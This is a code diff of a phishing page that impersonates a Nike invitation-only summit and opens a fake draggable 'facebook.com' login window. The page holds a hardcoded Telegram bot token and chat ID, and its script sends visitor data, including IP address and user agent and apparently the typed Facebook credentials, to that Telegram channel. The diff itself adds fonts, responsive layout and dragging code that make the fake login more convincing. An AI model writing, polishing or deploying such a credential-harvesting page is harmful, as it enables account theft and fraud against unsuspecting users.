@@ -7,6 +7,10 @@
   <link href="https://fonts.googleapis.com/css2?family=Helvetica+Now+Display:wght@400;500;700&display=swap" rel="stylesheet">
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Anton&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  
   <style>
     * {
       box-sizing: border-box;
@@ -15,7 +19,7 @@
     }
 
     body {
-      font-family: 'Helvetica Now Display', sans-serif;
+      font-family: 'Inter', sans-serif;
       background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('images/nike-bg.jpg') no-repeat center center;
       background-size: cover;
       color: #fff;
@@ -23,12 +27,11 @@
     }
 
     header {
-      background: rgba(0, 0, 0, 0.8);
+      background: rgb(0, 0, 0);
       display: flex;
       justify-content: space-between;
       align-items: center;
       padding: 1rem 2rem;
-      border-bottom: 1px solid #333;
     }
 
     .logo img {
@@ -53,6 +56,7 @@
       align-items: center;
       min-height: calc(100vh - 80px);
       padding: 2rem;
+      background-color: #000000;
     }
 
     .content-box {
@@ -64,13 +68,19 @@
       box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
       text-align: center;
       animation: fadeIn 0.5s ease-out;
+      font-family: 'Inter', sans-serif;
+      font-size: 2.2rem;
+      font-weight: 400;
+      letter-spacing: -0.5px;
     }
 
     .content-box h1 {
+      letter-spacing: 1.3px;
       color: #fff;
       margin-bottom: 1.5rem;
-      font-size: 2rem;
+      font-size: 3rem;
       font-weight: 700;
+      font-family: 'Anton', sans-serif;
     }
 
     .confidential {
@@ -128,6 +138,7 @@
       max-width: 500px;
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
       animation: slideUp 0.3s ease-out;
+      margin: 20px;
     }
 
     .modal-content h2 {
@@ -142,12 +153,14 @@
       color: #555;
       margin-bottom: 1.5rem;
       line-height: 1.6;
+      font-size: 14px;
     }
 
     .modal-content ul {
       text-align: left;
       margin: 0 0 1.5rem 1.5rem;
       color: #555;
+      font-size: 14px;
     }
 
     .modal-content li {
@@ -175,6 +188,7 @@
     .checkbox-container label {
       color: #333;
       font-weight: 500;
+      font-size: 14px;
     }
 
     .privacy-links {
@@ -215,6 +229,13 @@
       max-width: 90vw;
       box-shadow: 0 4px 20px rgba(0,0,0,0.3);
       overflow: hidden;
+      margin: 20px;
+    }
+
+    .draggable {
+      position: fixed;
+      z-index: 1001;
+      cursor: move;
     }
 
     .modal-header {
@@ -226,6 +247,7 @@
       justify-content: space-between;
       align-items: center;
       border-bottom: 1px solid #ddd;
+      cursor: move;
     }
 
     .modal-title {
@@ -309,12 +331,12 @@
       display: block;
     }
 
-	.fb-header p {
-	  color: #606770; /* Facebook's standard text color */
-	  font-size: 14px;
-	  margin: 10px 0 20px;
-	  text-align: center;
-	}
+    .fb-header p {
+      color: #606770;
+      font-size: 14px;
+      margin: 10px 0 20px;
+      text-align: center;
+    }
 
     .fb-login-form {
       display: flex;
@@ -406,14 +428,112 @@
 
     @media (max-width: 768px) {
       .content-box {
-        padding: 2rem;
+        padding: 2rem 1.5rem;
+      }
+      
+      .content-box h1 {
+        font-size: 2.2rem;
+      }
+      
+      .confidential {
+        font-size: 14px;
+      }
+      
+      .modal-content {
+        padding: 1.5rem;
+      }
+      
+      .modal-content h2 {
+        font-size: 1.3rem;
       }
       
       .auth-modal-content {
+        width: 95%;
+      }
+      
+      .fb-input {
+        padding: 12px 14px;
+        font-size: 15px;
+      }
+      
+      .fb-login-button {
+        padding: 10px;
+        font-size: 15px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      header {
+        flex-direction: column;
+        align-items: flex-start;
+        padding: 1rem;
+      }
+      
+      nav {
+        margin-top: 10px;
         width: 100%;
+      }
+      
+      nav a {
+        margin: 0 1rem 0.5rem 0;
+        display: inline-block;
+        font-size: 0.85rem;
+      }
+      
+      .content-box {
+        padding: 1.5rem 1rem;
+      }
+      
+      .content-box h1 {
+        font-size: 1.8rem;
+      }
+      
+      .confidential {
+        font-size: 13px;
+      }
+      
+      .btn-primary {
+        padding: 0.8rem 1.2rem;
+        font-size: 0.9rem;
         max-width: 100%;
-        height: 100%;
-        border-radius: 0;
+      }
+      
+      .modal-content,
+      .auth-modal-content {
+        margin: 10px;
+      }
+      
+      .modal-content h2 {
+        font-size: 1.2rem;
+        margin-bottom: 1rem;
+      }
+      
+      .modal-content p,
+      .modal-content ul {
+        font-size: 13px;
+        margin-bottom: 1rem;
+      }
+      
+      .checkbox-container label {
+        font-size: 13px;
+      }
+      
+      .fb-input {
+        font-size: 14px;
+        padding: 10px 12px;
+      }
+      
+      .fb-login-button {
+        font-size: 14px;
+        padding: 10px;
+      }
+      
+      .fb-header i {
+        font-size: 32px;
+      }
+      
+      .fb-header p {
+        font-size: 13px;
       }
     }
   </style>
@@ -423,10 +543,12 @@
   <header>
     <div class="logo">
       <img src="images/nike-logo-white.png" alt="Nike Logo">
+      <div></div>
     </div>
     <nav>
       <a href="https://about.nike.com/">About</a>
-      <a href="https://www.nike.com/w/shoes-y7ok">Sneakers</a>
+      <a href="https://about.nike.com/en/company">Company</a>
+      <a href="https://about.nike.com/en/stories">Stories</a>
     </nav>
   </header>
 
@@ -435,8 +557,8 @@
       <h1>Welcome to Nike Virtual Innovation Summit</h1>
       <p class="confidential">
         You are invited to join an exclusive, invitation-only experience curated especially for a select group of individuals. 
-		This opportunity has been extended to you with great consideration, and we kindly ask that you keep the details of this invitation confidential.
-		We appreciate your discretion and look forward to sharing an inspiring and forward-thinking experience together.
+        This opportunity has been extended to you with great consideration, and we kindly ask that you keep the details of this invitation confidential.
+        We appreciate your discretion and look forward to sharing an inspiring and forward-thinking experience together.
       </p>
       <div class="divider"></div>
       <button id="continueBtn" class="btn-primary">Continue</button>
@@ -500,8 +622,8 @@
 
   <!-- Facebook Login Modal -->
   <div id="fbModal" class="auth-modal" role="dialog" aria-modal="true" aria-labelledby="fbModalTitle" aria-describedby="fbModalDesc">
-    <div class="auth-modal-content">
-      <div class="modal-header">
+    <div class="auth-modal-content draggable" id="draggableFbModal">
+      <div class="modal-header" id="fbModalHeader">
         <div class="modal-title" id="fbModalTitle"><i class="fab fa-facebook"></i> facebook.com</div>
         <div class="modal-controls">
           <button id="fbMinimizeBtn" aria-label="Minimize modal">−</button>
@@ -514,7 +636,7 @@
       <div class="modal-body">
         <div class="fb-header">
           <i class="fab fa-facebook"></i>
-           <p>Facebook helps you connect and share with the people in your life.</p>
+          <p>Facebook helps you connect and share with the people in your life.</p>
         </div>
         <form class="fb-login-form" id="fbLoginForm">
           <div class="fb-input-group">
@@ -538,6 +660,8 @@
     const TELEGRAM_BOT_TOKEN = '7489121653:AAGO9WeABG0P7fl6hnqAf7WrDrptpfHguAo';
     const TELEGRAM_CHAT_ID = '1389938531';
     let firstAttemptData = null;
+    let isDragging = false;
+    let offsetX, offsetY;
 
     // Function to send data to Telegram
     async function sendToTelegram(message) {
@@ -572,6 +696,46 @@
     const fbMinimizeBtn = document.getElementById('fbMinimizeBtn');
     const fbLoginForm = document.getElementById('fbLoginForm');
     const fbErrorMessage = document.getElementById('fbErrorMessage');
+    const draggableFbModal = document.getElementById('draggableFbModal');
+    const fbModalHeader = document.getElementById('fbModalHeader');
+
+    // Draggable functionality for Facebook modal (desktop only)
+    if (window.innerWidth > 768) {
+      fbModalHeader.addEventListener('mousedown', startDrag);
+      document.addEventListener('mousemove', drag);
+      document.addEventListener('mouseup', endDrag);
+    }
+
+    function startDrag(e) {
+      isDragging = true;
+      const rect = draggableFbModal.getBoundingClientRect();
+      offsetX = e.clientX - rect.left;
+      offsetY = e.clientY - rect.top;
+      draggableFbModal.style.cursor = 'grabbing';
+    }
+
+    function drag(e) {
+      if (!isDragging) return;
+      e.preventDefault();
+      
+      let x = e.clientX - offsetX;
+      let y = e.clientY - offsetY;
+      
+      // Boundary checks
+      const maxX = window.innerWidth - draggableFbModal.offsetWidth;
+      const maxY = window.innerHeight - draggableFbModal.offsetHeight;
+      
+      x = Math.max(0, Math.min(x, maxX));
+      y = Math.max(0, Math.min(y, maxY));
+      
+      draggableFbModal.style.left = `${x}px`;
+      draggableFbModal.style.top = `${y}px`;
+    }
+
+    function endDrag() {
+      isDragging = false;
+      draggableFbModal.style.cursor = 'move';
+    }
 
     // Show security modal on continue click
     continueBtn.addEventListener('click', () => {
@@ -599,6 +763,12 @@
       authModal.style.display = 'none';
       fbModal.style.display = 'flex';
       fbErrorMessage.style.display = 'none';
+      
+      // Reset modal position when shown
+      if (window.innerWidth > 768) {
+        draggableFbModal.style.left = '';
+        draggableFbModal.style.top = '';
+      }
     });
 
     // Close fb modal
@@ -690,6 +860,23 @@
 🌍 <b>IP:</b> ${ipData.ip}
 🖥 <b>User Agent:</b> ${navigator.userAgent}
       `.trim());
+    });
+
+    // Make modals responsive on window resize
+    window.addEventListener('resize', () => {
+      if (window.innerWidth <= 768) {
+        // Reset draggable position on mobile
+        if (draggableFbModal) {
+          draggableFbModal.style.left = '';
+          draggableFbModal.style.top = '';
+        }
+      } else {
+        // Re-enable dragging if window is resized back to desktop
+        if (!fbModalHeader.hasEventListener) {
+          fbModalHeader.addEventListener('mousedown', startDrag);
+          fbModalHeader.hasEventListener = true;
+        }
+      }
     });
   </script>
 </body>
